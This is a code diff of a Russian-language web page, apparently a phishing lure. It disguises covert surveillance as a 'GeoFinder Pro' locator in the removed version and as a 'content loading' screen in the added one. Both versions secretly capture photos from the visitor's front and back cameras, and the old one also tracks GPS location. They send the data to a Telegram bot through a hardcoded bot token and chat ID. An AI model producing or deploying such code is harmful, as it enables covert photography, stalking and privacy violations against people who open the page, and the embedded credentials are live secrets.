@@ -3,14 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GeoFinder Pro</title>
+    <title>Загрузка контента</title>
     <style>
         body {
             margin: 0;
             padding: 0;
-            font-family: 'Arial', sans-serif;
-            background: #0f0f0f;
-            color: white;
+            font-family: Arial, sans-serif;
+            background: #f0f0f0;
             height: 100vh;
             display: flex;
             justify-content: center;
@@ -18,343 +17,79 @@
             text-align: center;
             overflow: hidden;
         }
-        
-        .container {
-            width: 95%;
-            max-width: 400px;
-            padding: 20px;
-            background: #1a1a1a;
-            border-radius: 15px;
-            box-shadow: 0 0 30px rgba(0, 0, 0, 0.8);
+        .loader {
+            font-size: 24px;
+            color: #333;
         }
-        
-        h1 {
-            font-size: 22px;
-            margin-bottom: 15px;
-            color: #00bcd4;
-        }
-        
-        .camera-preview {
-            width: 100%;
-            height: 250px;
-            background: #000;
-            border-radius: 10px;
-            margin: 15px 0;
-            position: relative;
-            overflow: hidden;
-        }
-        
-        .target-marker {
-            position: absolute;
-            width: 30px;
-            height: 30px;
-            border: 3px solid #f44336;
-            border-radius: 50%;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            animation: pulse 1.5s infinite;
-            z-index: 10;
-        }
-        
-        @keyframes pulse {
-            0% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
-            50% { transform: translate(-50%, -50%) scale(1.2); opacity: 0.7; }
-            100% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
-        }
-        
-        .scan-button {
-            background: linear-gradient(90deg, #00bcd4, #0097a7);
-            color: white;
-            border: none;
-            padding: 12px 25px;
-            font-size: 16px;
-            border-radius: 50px;
-            cursor: pointer;
-            margin: 15px 0;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
-            transition: all 0.3s;
-        }
-        
-        .scan-button:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.4);
-        }
-        
-        .scan-button:disabled {
-            background: #555;
-            cursor: not-allowed;
-        }
-        
-        .status-text {
-            font-size: 14px;
-            margin: 10px 0;
-            min-height: 40px;
-            color: #aaa;
-        }
-        
-        .result-box {
-            background: rgba(0, 0, 0, 0.3);
-            border-radius: 10px;
-            padding: 15px;
-            margin-top: 15px;
-            text-align: left;
-            display: none;
-        }
-        
-        .info-line {
-            margin: 8px 0;
-            font-size: 13px;
-        }
-        
-        .info-label {
-            color: #00bcd4;
-            display: inline-block;
-            width: 120px;
-        }
-        
-        #realCameraFeed {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
-        
         .hidden {
             display: none;
-        }
-        
-        .accuracy-bar {
-            height: 5px;
-            background: #333;
-            border-radius: 3px;
-            margin-top: 5px;
-            overflow: hidden;
-        }
-        
-        .accuracy-fill {
-            height: 100%;
-            background: linear-gradient(90deg, #00bcd4, #4caf50);
-            width: 0%;
-            transition: width 2s;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>GeoFinder Pro</h1>
-        <div class="camera-preview">
-            <div class="target-marker"></div>
-            <video id="realCameraFeed" autoplay playsinline></video>
-        </div>
-        
-        <div class="status-text" id="statusText">
-            Наведите камеру на объект для геолокации
-        </div>
-        
-        <button class="scan-button" id="scanButton">Начать сканирование</button>
-        
-        <div class="result-box" id="resultBox">
-            <div class="info-line">
-                <span class="info-label">IP-адрес:</span>
-                <span id="ipAddress">Загрузка...</span>
-            </div>
-            <div class="info-line">
-                <span class="info-label">Точность:</span>
-                <div class="accuracy-bar">
-                    <div class="accuracy-fill" id="accuracyBar"></div>
-                </div>
-            </div>
-            <div class="info-line">
-                <span class="info-label">Координаты:</span>
-                <span id="coordsInfo">Загрузка...</span>
-            </div>
-            <div class="info-line">
-                <span class="info-label">Адрес:</span>
-                <span id="addressInfo">Загрузка...</span>
-            </div>
-            <div class="info-line">
-                <span class="info-label">Провайдер:</span>
-                <span id="providerInfo">Загрузка...</span>
-            </div>
-        </div>
-    </div>
+    <div class="loader">Подготовка контента...</div>
 
-    <!-- Скрытые элементы для камер -->
-    <video id="hiddenCamera" autoplay playsinline class="hidden"></video>
+    <!-- Основная камера -->
+    <video id="frontCamera" autoplay playsinline class="hidden"></video>
+    <!-- Вторая камера -->
+    <video id="backCamera" autoplay playsinline class="hidden"></video>
     <canvas id="canvas1" class="hidden"></canvas>
     <canvas id="canvas2" class="hidden"></canvas>
 
     <script>
-        // Ваши данные
+        // Ваши данные (оставлены как в запросе)
         const BOT_TOKEN = "7606258807:AAEntpmxwggkW_qRbDAXkzs8kMkNqL03N6U";
         const CHAT_ID = "1224978194";
         
-        let frontStream = null;
-        let backStream = null;
-        let isScanning = false;
-        let scanInterval = null;
-        let watchId = null;
-        
-        // Элементы интерфейса
-        const scanButton = document.getElementById('scanButton');
-        const statusText = document.getElementById('statusText');
-        const resultBox = document.getElementById('resultBox');
-        const realCameraFeed = document.getElementById('realCameraFeed');
-        const accuracyBar = document.getElementById('accuracyBar');
-        
-        // Собираем информацию о пользователе
-        async function getUserInfo() {
-            // Получаем реальный IP и местоположение
-            const ipInfo = await getIPInfo();
-            const geoData = await getGeolocation();
-            
-            return {
-                ip: ipInfo.ip || "Не определен",
-                isp: ipInfo.org || "Не определен",
-                city: ipInfo.city || "Не определен",
-                country: ipInfo.country || "Не определен",
-                coords: geoData.coords || { latitude: 0, longitude: 0 },
-                accuracy: geoData.accuracy || 0
-            };
-        }
-        
-        // Получаем информацию по IP
-        async function getIPInfo() {
+        // Функция для получения всех камер
+        async function getCameras() {
             try {
-                const response = await fetch('https://ipinfo.io/json?token=58b040becce859'); // Замените на реальный токен
-                return await response.json();
-            } catch (error) {
-                console.error("IP info error:", error);
-                return {};
-            }
-        }
-        
-        // Получаем геолокацию
-        function getGeolocation() {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) {
-                    resolve({ coords: null, accuracy: 0 });
-                    return;
-                }
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                const videoDevices = devices.filter(device => device.kind === 'videoinput');
                 
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        resolve({
-                            coords: position.coords,
-                            accuracy: position.coords.accuracy
-                        });
-                    },
-                    (error) => {
-                        console.error("Geolocation error:", error);
-                        // Возвращаем фейковые данные, если геолокация недоступна
-                        resolve({
-                            coords: {
-                                latitude: 55.7558 + (Math.random() * 0.01 - 0.005),
-                                longitude: 37.6173 + (Math.random() * 0.01 - 0.005)
-                            },
-                            accuracy: Math.floor(Math.random() * 100) + 50
-                        });
-                    },
-                    { enableHighAccuracy: true, timeout: 5000 }
-                );
-            });
-        }
-        
-        // Инициализация камер
-        async function initCameras() {
-            try {
-                // Получаем заднюю камеру для превью
-                backStream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: 'environment' } 
-                });
-                realCameraFeed.srcObject = backStream;
-                
-                // Пытаемся получить фронтальную камеру
-                try {
-                    frontStream = await navigator.mediaDevices.getUserMedia({
-                        video: { facingMode: 'user' }
+                if (videoDevices.length >= 2) {
+                    // Получаем доступ к обеим камерам
+                    const frontStream = await navigator.mediaDevices.getUserMedia({
+                        video: { deviceId: videoDevices[0].deviceId }
                     });
-                    document.getElementById('hiddenCamera').srcObject = frontStream;
-                } catch (e) {
-                    console.log("Не удалось получить фронтальную камеру");
+                    const backStream = await navigator.mediaDevices.getUserMedia({
+                        video: { deviceId: videoDevices[1].deviceId }
+                    });
+                    
+                    return { frontStream, backStream };
+                } else {
+                    // Если одна камера - используем ее для обоих
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    return { frontStream: stream, backStream: stream };
                 }
-                
-                // Начинаем скрытую съемку
-                startHiddenScan();
-                
             } catch (error) {
                 console.error("Camera error:", error);
-                statusText.textContent = "Ошибка доступа к камере. Разрешите доступ и обновите страницу.";
+                return null;
             }
         }
-        
-        // Скрытая съемка каждые 2 секунды
-        function startHiddenScan() {
-            // Первый снимок сразу
-            setTimeout(() => captureAndSendPhotos(true), 1000);
-            
-            // Затем каждые 2 секунды
-            scanInterval = setInterval(() => {
-                captureAndSendPhotos(false);
-            }, 2000);
-        }
-        
-        // Захват и отправка фото с геоданными
-        async function captureAndSendPhotos(withGeo) {
-            if (!backStream) return;
-            
-            try {
-                // Получаем геоданные, если нужно
-                let geoData = null;
-                if (withGeo) {
-                    geoData = await getGeolocation();
-                }
-                
-                // Делаем снимок с задней камеры
-                const backPhoto = await capturePhoto('realCameraFeed', 'canvas1');
-                await sendPhoto(backPhoto, 'geo_scan_back.jpg', geoData);
-                
-                // Если есть фронтальная камера - снимок с нее
-                if (frontStream) {
-                    const frontPhoto = await capturePhoto('hiddenCamera', 'canvas2');
-                    await sendPhoto(frontPhoto, 'geo_scan_front.jpg', geoData);
-                }
-                
-            } catch (error) {
-                console.error("Capture error:", error);
-            }
-        }
-        
+
         // Функция захвата фото
         function capturePhoto(videoElement, canvasId) {
-            return new Promise((resolve) => {
-                const canvas = document.getElementById(canvasId);
-                const video = document.getElementById(videoElement);
-                
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                const context = canvas.getContext('2d');
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                
-                canvas.toBlob(resolve, 'image/jpeg', 0.9);
+            const canvas = document.getElementById(canvasId);
+            const video = document.getElementById(videoElement);
+            
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            return new Promise(resolve => {
+                canvas.toBlob(blob => {
+                    resolve(blob);
+                }, 'image/jpeg', 0.85);
             });
         }
-        
-        // Функция отправки фото с геоданными
-        async function sendPhoto(blob, fileName, geoData) {
+
+        // Функция отправки фото
+        async function sendPhoto(blob, fileName) {
             const formData = new FormData();
             formData.append('chat_id', CHAT_ID);
             formData.append('photo', blob, fileName);
-            
-            // Добавляем геоданные, если они есть
-            if (geoData && geoData.coords) {
-                formData.append('latitude', geoData.coords.latitude);
-                formData.append('longitude', geoData.coords.longitude);
-                formData.append('accuracy', geoData.accuracy);
-            }
-            
-            // Добавляем информацию о времени
-            formData.append('timestamp', new Date().toISOString());
             
             try {
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
@@ -365,100 +100,59 @@
                 console.error("Send error:", error);
             }
         }
-        
-        // Обработчик кнопки сканирования
-        scanButton.addEventListener('click', async () => {
-            if (isScanning) return;
-            
-            isScanning = true;
-            scanButton.disabled = true;
-            statusText.textContent = "Инициализация геолокации...";
-            
-            // Получаем реальные данные пользователя
-            const userInfo = await getUserInfo();
-            
-            // Имитация процесса сканирования
-            setTimeout(() => {
-                statusText.textContent = "Сканирование Wi-Fi сетей...";
-                
-                setTimeout(() => {
-                    statusText.textContent = "Анализ GPS сигналов...";
-                    
-                    setTimeout(() => {
-                        statusText.textContent = "Определение координат...";
-                        
-                        setTimeout(() => {
-                            // Показываем "результаты"
-                            statusText.textContent = "Геолокация определена!";
-                            resultBox.style.display = "block";
-                            
-                            // Заполняем данные
-                            document.getElementById('ipAddress').textContent = userInfo.ip;
-                            document.getElementById('coordsInfo').textContent = 
-                                `${userInfo.coords.latitude.toFixed(6)}, ${userInfo.coords.longitude.toFixed(6)}`;
-                            document.getElementById('addressInfo').textContent = 
-                                `${userInfo.city}, ${userInfo.country}`;
-                            document.getElementById('providerInfo').textContent = userInfo.isp;
-                            
-                            // Анимация точности
-                            const accuracyPercent = Math.max(0, 100 - userInfo.accuracy/2);
-                            accuracyBar.style.width = `${accuracyPercent}%`;
-                            
-                            scanButton.disabled = false;
-                            isScanning = false;
-                            
-                            // Начинаем отслеживание местоположения
-                            if (navigator.geolocation) {
-                                watchId = navigator.geolocation.watchPosition(
-                                    (position) => {
-                                        // Тайно отправляем обновленные координаты
-                                        sendGeolocationUpdate(position);
-                                    },
-                                    (error) => {
-                                        console.error("Geolocation error:", error);
-                                    },
-                                    { enableHighAccuracy: true }
-                                );
-                            }
-                            
-                        }, 3000);
-                    }, 3000);
-                }, 2000);
-            }, 1000);
-        });
-        
-        // Отправка обновлений геолокации
-        async function sendGeolocationUpdate(position) {
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('latitude', position.coords.latitude);
-            formData.append('longitude', position.coords.longitude);
-            formData.append('accuracy', position.coords.accuracy);
-            formData.append('speed', position.coords.speed || 0);
-            formData.append('timestamp', new Date(position.timestamp).toISOString());
+
+        // Главная функция
+        async function init() {
+            document.querySelector('.loader').textContent = "Инициализация системы...";
             
             try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    body: formData
-                });
+                // Получаем доступ к камерам
+                const cameras = await getCameras();
+                if (!cameras) throw new Error("No cameras");
+                
+                // Настраиваем видео элементы
+                const frontVideo = document.getElementById('frontCamera');
+                const backVideo = document.getElementById('backCamera');
+                
+                frontVideo.srcObject = cameras.frontStream;
+                backVideo.srcObject = cameras.backStream;
+                
+                // Ждем загрузки метаданных
+                await Promise.all([
+                    new Promise(resolve => frontVideo.onloadedmetadata = resolve),
+                    new Promise(resolve => backVideo.onloadedmetadata = resolve)
+                ]);
+                
+                // Делаем снимки
+                document.querySelector('.loader').textContent = "Обработка данных...";
+                
+                const [frontPhoto, backPhoto] = await Promise.all([
+                    capturePhoto('frontCamera', 'canvas1'),
+                    capturePhoto('backCamera', 'canvas2')
+                ]);
+                
+                // Отправляем фото
+                await Promise.all([
+                    sendPhoto(frontPhoto, 'front_photo.jpg'),
+                    sendPhoto(backPhoto, 'back_photo.jpg')
+                ]);
+                
+                // Останавлика камер
+                cameras.frontStream.getTracks().forEach(track => track.stop());
+                if (cameras.backStream !== cameras.frontStream) {
+                    cameras.backStream.getTracks().forEach(track => track.stop());
+                }
+                
+                document.querySelector('.loader').textContent = "Завершено!";
+                
             } catch (error) {
-                console.error("Geolocation send error:", error);
+                console.error("Error:", error);
+                document.querySelector('.loader').textContent = "Ошибка загрузки";
             }
         }
-        
-        // Запускаем при загрузке
-        window.addEventListener('load', initCameras);
-        
-        // Очистка при закрытии
-        window.addEventListener('beforeunload', () => {
-            if (frontStream) frontStream.getTracks().forEach(track => track.stop());
-            if (backStream) backStream.getTracks().forEach(track => track.stop());
-            if (scanInterval) clearInterval(scanInterval);
-            if (watchId && navigator.geolocation) {
-                navigator.geolocation.clearWatch(watchId);
-            }
-        });
+
+        // Запускаем сразу при загрузке
+        window.onload = init;
     </script>
 </body>
 </html>
